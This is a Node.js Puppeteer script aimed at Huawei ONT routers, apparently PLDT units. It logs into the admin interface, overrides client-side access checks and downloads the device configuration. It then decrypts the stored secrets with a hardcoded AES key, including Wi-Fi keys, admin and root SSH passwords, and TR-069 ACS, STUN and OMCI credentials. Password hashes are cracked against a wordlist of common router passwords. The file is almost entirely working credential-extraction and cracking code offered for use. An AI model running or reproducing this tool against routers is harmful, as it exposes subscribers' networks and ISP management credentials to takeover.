const puppeteer = require('puppeteer');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const KEY_HEX = '6fc6e3436a53b6310dc09a475494ac774e7afb21b9e58fc8e58b5660e48e2498';
const BLOCK_SIZE = 0x14;

function HW_AES_AesEnhSysToLong(buf) {
  let out = 0, v3 = 1;
  for (let i = 0; i < 5; i++) { out += v3 * buf[i]; v3 *= 0x5D; }
  return out >>> 0;
}

function HW_AES_PlainToBin(buf) {
  if (buf.length % 5 !== 0) return null;
  const out = Buffer.alloc(buf.length * 4 / 5);
  let pos = 0;
  for (let i = 0; i < out.length; i += 4) {
    out.writeUInt32LE(HW_AES_AesEnhSysToLong(buf.slice(pos, pos+5)), i);
    pos += 5;
  }
  return out;
}

function decryptHuawei(encryptedStr) {
  if (!encryptedStr.startsWith('$2') || !encryptedStr.endsWith('$')) return null;
  const trimmed = encryptedStr.substring(2, encryptedStr.length - 1);
  const buf = Buffer.from(trimmed, 'ascii');
  for (let i = 0; i < buf.length; i++) {
    if (buf[i] === 0x7e) buf[i] = 0x1e;
    else buf[i] -= 0x21;
  }
  if (buf.length % BLOCK_SIZE !== 0) return null;
  const bc = Math.floor(buf.length / BLOCK_SIZE);
  const ivRaw = buf.slice(bc * BLOCK_SIZE - BLOCK_SIZE, bc * BLOCK_SIZE);
  const IV = HW_AES_PlainToBin(ivRaw);
  const dataAll = HW_AES_PlainToBin(buf.slice(0, bc * BLOCK_SIZE - BLOCK_SIZE));
  if (!dataAll || !IV) return null;
  const d = crypto.createDecipheriv('aes-256-cbc', Buffer.from(KEY_HEX, 'hex'), IV);
  d.setAutoPadding(false);
  let dec = Buffer.concat([d.update(dataAll), d.final()]);
  const pad = dec[dec.length - 1];
  if (pad > 0 && pad <= 16) dec = dec.slice(0, dec.length - pad);
  return dec.toString('utf8').replace(/\0+$/, '');
}

function unescapeXml(s) {
  return s.replace(/&gt;/g, '>').replace(/&lt;/g, '<').replace(/&amp;/g, '&')
    .replace(/&apos;/g, "'").replace(/&quot;/g, '"').replace(/&#(\d+);/g, (_, c) => String.fromCharCode(c));
}

function isHex64(s) {
  return /^[0-9a-f]{64}$/i.test(s);
}

function parseArgs() {
  const args = {};
  const raw = process.argv.slice(2);
  for (let i = 0; i < raw.length; i++) {
    if (raw[i].startsWith('--') && i + 1 < raw.length && !raw[i+1].startsWith('--')) {
      args[raw[i].slice(2)] = raw[i+1];
      i++;
    }
  }
  return args;
}

async function waitForFile(dirPath, filename, timeoutMs = 30000) {
  const fp = path.join(dirPath, filename);
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (fs.existsSync(fp)) {
      const content = fs.readFileSync(fp, 'utf8');
      if (content.length > 1000) return content;
    }
    await new Promise(r => setTimeout(r, 500));
  }
  throw new Error('Timeout waiting for ' + filename);
}

function extractPlaintextPasswords(xml) {
  const results = [];

  // WebUI users (admin + adminpldt)
  const webUsers = [...xml.matchAll(
    /<X_HW_WebUserInfoInstance[^>]*?UserName="([^"]*)"[^>]*?Password="([^"]*)"[^>]*?UserLevel="([^"]*)"[^>]*?PassMode="([^"]*)"[^>]*?/g
  )];
  for (const m of webUsers) {
    const entry = { username: m[1], level: m[3], passmode: parseInt(m[4]) };
    const decrypted = decryptHuawei(unescapeXml(m[2]));
    if (decrypted && isHex64(decrypted)) {
      entry.password_hash = decrypted.toLowerCase();
    } else {
      entry.password = decrypted;
    }

    const saltMatch = xml.substring(m.index).match(/Salt="([^"]*)"/);
    if (saltMatch) entry.salt = saltMatch[1];

    const iterateMatch = xml.substring(m.index).match(/<X_HW_IteratePassword Password="([^"]*)"[^>]*?Salt="([^"]*)"[^>]*?IterateCount="([^"]*)"[^>]*?HashType="([^"]*)"/);
    if (iterateMatch) {
      const ipDec = decryptHuawei(unescapeXml(iterateMatch[1]));
      entry.iterate_password = ipDec;
      entry.iterate_salt = iterateMatch[2];
      entry.iterate_count = parseInt(iterateMatch[3]);
      entry.iterate_hashtype = parseInt(iterateMatch[4]);
    }

    const historyMatch = xml.substring(m.index).match(/<X_HW_HistoryInstance[^>]*?X_HW_Password="([^"]*)"[^>]*?X_HW_Time="([^"]*)"/);
    if (historyMatch) {
      entry.history_password = decryptHuawei(unescapeXml(historyMatch[1]));
      entry.history_time = historyMatch[2];
    }

    results.push(entry);
  }

  // CLI/SSH root user
  const rootMatch = xml.match(/<X_HW_CLIUserInfoInstance[^>]*?Username="([^"]*)"[^>]*?Userpassword="([^"]*)"/);
  if (rootMatch) {
    const entry = { username: rootMatch[1], service: 'CLI/SSH' };
    const decrypted = decryptHuawei(unescapeXml(rootMatch[2]));
    if (decrypted && isHex64(decrypted)) {
      entry.password_hash = decrypted.toLowerCase();
    } else {
      entry.password = decrypted;
    }
    results.push(entry);
  }

  // TR-069 ACS
  const tr069Match = xml.match(/<ManagementServer[^>]*>[^<]*<URL[^>]*>[^<]*<\/URL>[^<]*<Username>([^<]*)<\/Username>[^<]*<Password>([^<]*)<\/Password>/);
  if (!tr069Match) {
    const tr069Match2 = xml.match(/Username="pldtacs"\s+Password="([^"]*)"/);
    if (tr069Match2) results.push({ service: 'TR-069', username: 'pldtacs', password: decryptHuawei(unescapeXml(tr069Match2[1])) });
  } else {
    results.push({ service: 'TR-069', username: tr069Match[1], password: decryptHuawei(unescapeXml(tr069Match[2])) });
  }

  // ConnectionRequest
  const crMatch = xml.match(/ConnectionRequestPassword="([^"]*)"/);
  if (crMatch) results.push({ service: 'ACS ConnectionRequest', password: decryptHuawei(unescapeXml(crMatch[1])) });

  // STUN
  const stunMatch = xml.match(/STUNPassword="([^"]*)"\s+STUNMaximum/);
  if (stunMatch) results.push({ service: 'STUN', password: decryptHuawei(unescapeXml(stunMatch[1])) });

  // Certificate
  const certMatch = xml.match(/X_HW_CertPassword="([^"]*)"/);
  if (certMatch) results.push({ service: 'Certificate', password: decryptHuawei(unescapeXml(certMatch[1])) });

  // OMCI LocalAdmin / LocalUser
  const localAdmin = xml.match(/LocalAdminName="([^"]*)"[^>]*?LocalAdminPassword="([^"]*)"/);
  if (localAdmin) {
    const dec = decryptHuawei(unescapeXml(localAdmin[2]));
    results.push({ service: 'OMCI LocalAdmin', username: localAdmin[1], password: dec && isHex64(dec) ? dec.toLowerCase() : dec, password_hash: dec && isHex64(dec) ? dec.toLowerCase() : undefined });
  }
  const localUser = xml.match(/LocalUserName="([^"]*)"[^>]*?LocalUserPassword="([^"]*)"/);
  if (localUser) {
    const dec = decryptHuawei(unescapeXml(localUser[2]));
    results.push({ service: 'OMCI LocalUser', username: localUser[1], password: dec && isHex64(dec) ? dec.toLowerCase() : dec, password_hash: dec && isHex64(dec) ? dec.toLowerCase() : undefined });
  }

  return results;
}

function crackHash(hash, wordlistPath, iterateSalt, iterateCount) {
  if (!wordlistPath || !fs.existsSync(wordlistPath)) return null;
  const words = fs.readFileSync(wordlistPath, 'utf8').split(/\r?\n/).filter(w => w && !w.startsWith('#'));
  const h = hash.toLowerCase();

  if (iterateSalt && iterateCount) {
    // Use PBKDF2 verification (matching against iterate hash)
    for (const word of words) {
      const trimmed = word.trim();
      if (!trimmed) continue;
      try {
        const pbkdf2Result = crypto.pbkdf2Sync(trimmed, iterateSalt, iterateCount, 32, 'sha256');
        if (pbkdf2Result.toString('hex') === h) return trimmed;
      } catch {}
    }
  } else {
    // SHA-256 verification (fast)
    for (const word of words) {
      const trimmed = word.trim();
      if (!trimmed) continue;
      if (crypto.createHash('sha256').update(trimmed, 'utf8').digest('hex') === h) return trimmed;
      if (crypto.createHash('sha256').update(trimmed.toLowerCase(), 'utf8').digest('hex') === h) return trimmed.toLowerCase();
      if (crypto.createHash('sha256').update(trimmed.toUpperCase(), 'utf8').digest('hex') === h) return trimmed.toUpperCase();
    }
  }
  return null;
}

/**
 * Process an XML config string: decrypt fields, extract creds, crack hashes, output JSON.
 */
function processXml(xmlContent, wordlistPath) {
  // --- Extract WiFi passwords ---
  const allPsk = [...xmlContent.matchAll(/PreSharedKey="([^"]+)"/g)];
  const ssid24Match = xmlContent.match(/InstanceID="1"[^>]*?SSID="([^"]+)"/);
  const ssid5gMatch = xmlContent.match(/InstanceID="5"[^>]*?SSID="([^"]+)"/);

  const wifi = {};
  if (allPsk.length >= 2) {
    wifi.ssid_24 = ssid24Match ? ssid24Match[1] : '2.4GHz';
    wifi.ssid_5g = ssid5gMatch ? ssid5gMatch[1] : '5GHz';
    wifi.password_24 = decryptHuawei(unescapeXml(allPsk[0][1]));
    wifi.password_5g = decryptHuawei(unescapeXml(allPsk[1][1]));
  } else if (allPsk.length >= 1) {
    wifi.ssid_24 = ssid24Match ? ssid24Match[1] : '2.4GHz';
    wifi.password_24 = decryptHuawei(unescapeXml(allPsk[0][1]));
  }

  // --- Extract all credentials ---
  const allCreds = extractPlaintextPasswords(xmlContent);

  // --- Separate admin users and other credentials ---
  const admins = allCreds.filter(c => c.username || c.service === 'CLI/SSH');
  const other = allCreds.filter(c => !c.username && c.service !== 'CLI/SSH');

  // --- Crack hashes ---
  console.error('Cracking password hashes...');
  for (const admin of admins) {
    if (admin.password_hash) {
      const cracked = crackHash(admin.password_hash, wordlistPath);
      if (cracked) {
        admin.password = cracked;
        admin.password_cracked = true;
        console.error('  CRACKED: ' + (admin.username || admin.service) + ' => ' + cracked);
      }
    }
  }

  for (const admin of admins) {
    if (admin.iterate_password && isHex64(admin.iterate_password) && admin.iterate_salt && admin.iterate_count) {
      const cracked = crackHash(admin.iterate_password, wordlistPath, admin.iterate_salt, admin.iterate_count);
      if (cracked && !admin.password_cracked) {
        admin.password = cracked;
        admin.password_cracked = true;
        console.error('  CRACKED (PBKDF2): ' + (admin.username || admin.service) + ' => ' + cracked);
      }
      delete admin.iterate_password;
      delete admin.iterate_salt;
      delete admin.iterate_count;
      delete admin.iterate_hashtype;
    }
  }

  // --- Build result ---
  const result = { wifi };
  result.admins = admins.map(a => {
    const r = { username: a.username, service: a.service || 'WebUI', level: a.level, passmode: a.passmode };
    if (a.password_hash) { r.password_hash = a.password_hash; r.password_cracked = a.password_cracked; }
    if (a.password) r.password = a.password;
    if (a.iterate_password) r.iterate_password = a.iterate_password;
    if (a.iterate_count) r.iterate_count = a.iterate_count;
    if (a.history_password) r.history_password = a.history_password;
    if (a.history_time) r.history_time = a.history_time;
    if (a.salt) r.salt = a.salt;
    return r;
  });
  result.other_credentials = other.map(o => {
    const r = { service: o.service };
    if (o.username) r.username = o.username;
    if (o.password) r.password = o.password;
    if (o.password_hash) { r.password_hash = o.password_hash; r.password_cracked = o.password_cracked; }
    return r;
  });

  console.log(JSON.stringify(result));
}

(async () => {
  const args = parseArgs();
  const routerIp = args['router-ip'] || '192.168.1.1';
  const username = args['username'] || 'adminpldt';
  const password = args['password'] || '';
  const downloadPath = args['download-path'] || path.join(require('os').tmpdir(), 'psk_scan_' + Date.now().toString(36));
  const wordlistPath = args['wordlist'] || path.join(__dirname, '..', 'cred-scanner', 'wordlists', 'common-router-passwords.txt');
  const localFile = args['local-file'] || '';

  // ── Local file mode: skip browser, process XML directly ──
  if (localFile) {
    if (!fs.existsSync(localFile)) {
      console.log(JSON.stringify({ error: 'File not found: ' + localFile }));
      process.exit(1);
    }
    const xmlContent = fs.readFileSync(localFile, 'utf8');
    if (xmlContent.length < 500) {
      console.log(JSON.stringify({ error: 'File too small or invalid: ' + xmlContent.length + ' bytes' }));
      process.exit(1);
    }
    console.error('Processing local file:', localFile, xmlContent.length, 'bytes');
    processXml(xmlContent, wordlistPath);
    process.exit(0);
  }

  if (!password) {
    console.log(JSON.stringify({ error: 'Password is required' }));
    process.exit(1);
  }

  fs.mkdirSync(downloadPath, { recursive: true });

  const browser = await puppeteer.launch({
    headless: false,
    ignoreHTTPSErrors: true,
    args: ['--no-sandbox', '--ignore-certificate-errors', '--window-size=1280,720']
  });

  let success = false;
  let err = null;
  try {
    const [page] = await browser.pages();

    console.error('Navigating to login page...');
    await page.goto(`https://${routerIp}/admin.html`, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await new Promise(r => setTimeout(r, 2000));

    let sessionCookie = null;
    page.on('response', async res => {
      if (res.url().includes('login.cgi')) {
        const sc = res.headers()['set-cookie'];
        if (sc) { const m = sc.match(/Cookie=([^;]+)/); if (m) sessionCookie = m[1]; }
      }
    });

    await page.evaluate(() => {
      window.setDisable = () => {};
      window.CheckPassword = () => 0;
      window.Userlevel = 0;
      window.preflag = 0;
    });

    if (await page.$('input#txt_Username')) {
      console.error('Entering credentials...');
      await page.type('input#txt_Username', username, { delay: 15 });
      await page.type('input#txt_Password', password, { delay: 15 });
      await Promise.all([
        page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
        page.click('button#button')
      ]);
      await new Promise(r => setTimeout(r, 2000));
    }

    const currentUrl = page.url();

    // Capture session cookie from any login response
    if (!sessionCookie) {
      const cookies = await page.cookies();
      const co = cookies.find(c => c.name === 'Cookie');
      if (co) sessionCookie = co.value;
    }

    // If still on login page (auto-logout or failed), try using cookies directly
    if (currentUrl.includes('admin.html') || currentUrl.includes('login')) {
      if (sessionCookie) {
        console.error('Got session cookie, retrying cfgfile page...');
        await page.goto(`https://${routerIp}/html/ssmp/cfgfile/cfgfile.asp`, { waitUntil: 'domcontentloaded', timeout: 15000 });
        await new Promise(r => setTimeout(r, 2000));
      } else {
        throw new Error('Login failed - still on login page or auto-logged out. Check credentials or connectivity.');
      }
    }

    console.error('Navigating to config file page...');
    const navUrl = `https://${routerIp}/html/ssmp/cfgfile/cfgfile.asp`;
    await page.goto(navUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });
    await new Promise(r => setTimeout(r, 2000));

    // Retry cfgfile page if redirected (auto-logout scenario)
    if (!page.url().includes('cfgfile')) {
      console.error('Redirected from cfgfile page (auto-logout?), retrying...');
      await page.goto(navUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });
      await new Promise(r => setTimeout(r, 2000));
    }

    let hasToken = await page.evaluate(() => {
      const el = document.getElementById('hwonttoken');
      return el && el.value && el.value.length > 0;
    });
    if (!hasToken) {
      try {
        await page.waitForFunction(() => {
          const el = document.getElementById('hwonttoken');
          return el && el.value && el.value.length > 0;
        }, { timeout: 10000 });
        hasToken = true;
      } catch {
        console.error('No hwonttoken after wait - page URL:', page.url());
      }
    }

    const vars = await page.evaluate(() => ({
      token: document.getElementById('hwonttoken')?.value || '',
      reqFile: typeof reqFile !== 'undefined' ? reqFile : 'html/ssmp/cfgfile/cfgfile.asp',
    }));

    if (!vars.token) throw new Error('No hwonttoken found - not on cfgfile page (URL: ' + page.url() + ')');

    // Download config via fetch() from within the page context
    // This avoids reliance on browser file download (which fails in PHP/headless env)
    console.error('Downloading config via fetch...');
    let xmlContent = null;

    // First, prepare the server-side file load (same as XmlHttpSendAspFlieWithoutResponse)
    await page.evaluate(() => {
      try {
        const prep = new XMLHttpRequest();
        prep.open('GET', '/html/ssmp/common/StartFileLoad.asp', false);
        prep.send();
      } catch (e) {}
    });

    // Try fetch() first (works in modern Chrome with same-origin)
    xmlContent = await page.evaluate(async (token) => {
      try {
        const resp = await fetch('/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'x.X_HW_Token=' + encodeURIComponent(token),
        });
        if (resp.ok) {
          const text = await resp.text();
          if (text && text.length > 1000 && text.includes('<')) return text;
        }
      } catch (e) {}
      return null;
    }, vars.token);

    // Fallback: synchronous XHR
    if (!xmlContent) {
      console.error('Fetch failed, trying XHR fallback...');
      xmlContent = await page.evaluate((token) => {
        try {
          const xhr = new XMLHttpRequest();
          xhr.open('POST', '/html/ssmp/cfgfile/cfgfiledown.cgi?&RequestFile=html/ssmp/cfgfile/cfgfile.asp', false);
          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhr.send('x.X_HW_Token=' + encodeURIComponent(token));
          if (xhr.status === 200 && xhr.responseText && xhr.responseText.length > 1000 && xhr.responseText.includes('<')) {
            return xhr.responseText;
          }
        } catch (e) {}
        return null;
      }, vars.token);
    }

    if (!xmlContent) {
      throw new Error('Failed to download config via fetch/XHR');
    }

    console.error('Download succeeded, size:', xmlContent.length, 'bytes');
    fs.writeFileSync(path.join(downloadPath, 'hw_ctree.xml'), xmlContent, 'utf8');
    console.error('Processing credentials...');
    processXml(xmlContent, wordlistPath);
    success = true;
  } catch (e) {
    err = e;
    throw e;
  } finally {
    await browser.close().catch(() => {});
    try {
      const files = fs.readdirSync(downloadPath);
      files.forEach(f => { try { fs.unlinkSync(path.join(downloadPath, f)); } catch {} });
      try { fs.rmdirSync(downloadPath); } catch {}
    } catch {}
    if (success) process.exit(0);
    else if (err) throw err;
    else throw new Error('Script failed during execution');
  }
})().catch(e => {
  console.log(JSON.stringify({ error: e.message, stack: e.stack?.split('\n').slice(0, 5).join(' ') }));
  process.exit(1);
});
